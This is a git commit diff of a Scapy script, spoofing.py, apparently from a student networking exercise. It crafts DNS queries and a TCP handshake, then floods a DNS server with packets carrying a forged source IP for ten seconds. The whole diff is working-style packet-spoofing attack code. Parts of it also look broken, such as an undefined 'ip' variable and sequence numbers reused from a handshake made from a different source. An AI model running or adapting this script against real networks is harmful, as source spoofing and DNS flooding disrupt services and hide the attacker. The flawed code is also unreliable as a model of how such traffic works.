23e3c061bca81ec07e22d6e2577ed409626643fc
nubi12336 <syislu62823@kaist.ac.kr>
2021-04-09 21:46:24 +0900

    d

--- spoofing.py
+++ spoofing.py
@@ -3,11 +3,19 @@ import time
 
 A= "192.168.30.1"
 B= "192.168.20.1"
-C= RandShort()
-D= 53
-E= DNS(rd=1,qd=DNSQR(qname="google.com",qtype="MX"))
+
+request = DNS(rd=1, qd=DNSQR(qname = "cnn.com", qtype="A")) # size = 25, hex = 0x19
+twoBytesRequestSize = "\x00\x19" #BIG ENDIAN
+C = str(request) + twoBytesRequestSize
+# Create TCP Packet with SYN
+SYN = ip/TCP(sport=RandNum(1024,65535), dport=53, flags="S", seq = 32)
+# Send the crafted packet, and get SYN ACK from the other end
+SYNACK = sr1(SYN)
+# We, the client need to send ACK for the server's SYN
+ACK = ip/TCP(sport=SYNACK.dport, dport=53, flags="A", seq=SYNACK.ack, ack = SYNACK.seq +1)
+send(ACK)
 
 start = time.time()
 while (time.time() - start < 10):
-    spoofed_packet = IP(src=A, dst=B) / UDP(sport=C, dport=D) / E
+    spoofed_packet = IP(src=A, dst=B) / TCP(sport=SYNACK.dport, dport=53, flags="PA", seq=SYNACK.ack, ack = SYNACK.seq +1) / C
     send(spoofed_packet)
